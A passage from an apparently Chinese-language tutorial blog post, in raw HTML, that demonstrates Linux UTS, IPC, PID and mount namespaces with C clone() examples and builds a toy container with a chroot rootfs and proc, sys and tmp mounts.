class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个给 clone 用的栈，栈大小1M */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container - inside the container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 直接执行一个shell，以便我们观察这个进程空间里的资源是否被隔离了 */</span></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - start a container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */</span></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 等待子进程结束 */</span></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接启用通过execv启用一个子进程，到新的 /bin/bash 环境，这里没做任何隔离，父进程能做的子进程基本都可以做</p><h2 id="UTS-Namespace"><a href="#UTS-Namespace" class="headerlink" title="UTS Namespace"></a>UTS Namespace</h2><p>可通过 clone() 函数设置 <code>CLONE_NEWUTS</code> 标志位实现，需要 root 权限<br>uts_ns.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个给 clone 用的栈，栈大小1M */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container - inside the container!\n&quot;</span>);</span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>); <span class="comment">/* 设置hostname */</span></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - start a container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */</span></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 等待子进程结束 */</span></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子进程运行 <code>hostname</code> 查看主机名变成 container, 宿主机不变，这里注意如果是用 <code>hostnamectl sethostname &lt;xxx&gt;</code> 命令会改变宿主机的 hostname，因为这个命令是通过写文件实现的，这里并未做文件隔离</p><h3 id="IPC-Mamespace"><a href="#IPC-Mamespace" class="headerlink" title="IPC Mamespace"></a>IPC Mamespace</h3><p>可通过 clone() 函数设置 <code>CLONE_NEWIPC</code> 标志位实现，需要 root 权限</p><p>ipc.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个给 clone 用的栈，栈大小1M */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container - inside the container!\n&quot;</span>);</span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>); <span class="comment">/* 设置hostname */</span></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - start a container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */</span></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 等待子进程结束 */</span></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ipcmk -Q</code> 创建一个进程通信消息队列，通过 <code>ipcs -q</code> 查看新建的队列。<br>运行进程间通信隔离程序，子进程内运行 <code>ipcs -q</code> 看不到新建的队列</p><h3 id="PID-Namespace"><a href="#PID-Namespace" class="headerlink" title="PID Namespace"></a>PID Namespace</h3><p>可通过 clone() 函数设置 <code>CLONE_NEWPID</code> 标志位实现，需要 root 权限</p><p>pid_ns.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个给 clone 用的栈，栈大小1M */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - inside the container!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container - inside the container!\n&quot;</span>);</span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>); <span class="comment">/* 设置hostname */</span></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - start a container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */</span></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 等待子进程结束 */</span></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行进程隔离程序会发现我们程序的pid为1，pid为1是特殊的进程，在表1介绍中有列举一些特殊性<br>这里直接 ps 会发现只有当前子进程的进程号，但通过 <code>ps -ef</code> 或者 <code>top</code> 命令会查看到所有进程号，这里是因为 <code>ps -ef</code> 会读取 <code>/proc</code> 文件系统，这里还未对此文件系统进行隔离</p><h3 id="MNT-Namespace"><a href="#MNT-Namespace" class="headerlink" title="MNT Namespace"></a>MNT Namespace</h3><p>可通过 clone() 函数设置 <code>CLONE_NEWNS</code> 标志位实现，需要 root 权限</p><p>mnt_ns.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个给 clone 用的栈，栈大小1M */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - inside the container!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container - inside the container!\n&quot;</span>);</span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>); <span class="comment">/* 设置hostname */</span></span><br><span class="line">    system(<span class="string">&quot;mount -t proc proc /proc&quot;</span>);</span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - start a container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */</span></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNS, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 等待子进程结束 */</span></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对 <code>/proc</code> 文件系统进行了隔离，此时在 <code>ps -ef</code> 或者 <code>top</code> 看到的也只有当前进程的进程号了，注意此程序会覆盖父进程的 <code>/proc</code> 系统，子进程退出后要通过 <code>umount</code> 或者 <code>mount -t proc proc /proc</code><br>当然除了 /proc 还有 /dev、/sys、/tmp、/run 等</p><h3 id="一个玩具容器"><a href="#一个玩具容器" class="headerlink" title="一个玩具容器"></a>一个玩具容器</h3><p>先创建一个 rootfs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p rootfs/&#123;bin,dev,etc,home,lib/x86_64-linux-gnu,lib64,mnt,opt,proc,root,run,sbin,sys,tmp,usr/bin,var&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>lib/x86_64-linux-gnu</code> 根据 <code>ldd</code> /bin 目录下各个命令结果的动态链接库来，我这里分别是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/bin/sh /usr/bin/ls /usr/bin/mount /usr/bin/cat /usr/bin/ps rootfs/usr/bin/</span><br><span class="line">cp /etc/hosts /etc/hostname /etc/resolv.conf rootfs/etc</span><br><span class="line">cp /lib/x86_64-linux-gnu/libc.so.6 rootfs/lib/x86_64-linux-gnu/</span><br><span class="line">cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64</span><br><span class="line">cp /lib/x86_64-linux-gnu/libselinux.so.1 rootfs/lib/x86_64-linux-gnu/libselinux.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/libpcre2-8.so.0 rootfs/lib/x86_64-linux-gnu/libpcre2-8.so.0</span><br><span class="line">cp /lib/x86_64-linux-gnu/libdl.so.2 rootfs/lib/x86_64-linux-gnu/libdl.so.2</span><br><span class="line">cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64/ld-linux-x86-64.so.2</span><br><span class="line">cp /lib/x86_64-linux-gnu/libpthread.so.0 rootfs/lib/x86_64-linux-gnu/libpthread.so.0</span><br><span class="line">cp /lib/x86_64-linux-gnu/libmount.so.1 rootfs/lib/x86_64-linux-gnu/libmount.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/libblkid.so.1 rootfs/lib/x86_64-linux-gnu/libblkid.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/libselinux.so.1 rootfs/lib/x86_64-linux-gnu/libselinux.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/libprocps.so.8 rootfs/lib/x86_64-linux-gnu/libprocps.so.8</span><br><span class="line">cp /lib/x86_64-linux-gnu/libsystemd.so.0 rootfs/lib/x86_64-linux-gnu/libsystemd.so.0</span><br><span class="line">cp /lib/x86_64-linux-gnu/librt.so.1 rootfs/lib/x86_64-linux-gnu/librt.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/liblzma.so.5 rootfs/lib/x86_64-linux-gnu/liblzma.so.5</span><br><span class="line">cp /lib/x86_64-linux-gnu/libzstd.so.1 rootfs/lib/x86_64-linux-gnu/libzstd.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/liblz4.so.1 rootfs/lib/x86_64-linux-gnu/liblz4.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/libgcrypt.so.20 rootfs/lib/x86_64-linux-gnu/libgcrypt.so.20</span><br><span class="line">cp /lib/x86_64-linux-gnu/libgpg-error.so.0 rootfs/lib/x86_64-linux-gnu/libgpg-error.so.0</span><br></pre></td></tr></table></figure><p><code>chroot rootfs</code> 改变根目录, 进入至新的文件系统里了，但是现在一些命名空间还没做隔离，加上上面的clone函数标志位</p><p>container.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/usr/bin/sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-l&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - inside the container!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//set hostname</span></span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//remount &quot;/proc&quot; to make sure the &quot;top&quot; and &quot;ps&quot; show container&#x27;s information</span></span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;rootfs/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) !=<span class="number">0</span> ) &#123;</span><br><span class="line">        perror(<span class="string">&quot;proc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;sysfs&quot;</span>, <span class="string">&quot;rootfs/sys&quot;</span>, <span class="string">&quot;sysfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sys&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;none&quot;</span>, <span class="string">&quot;rootfs/tmp&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;tmp&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span 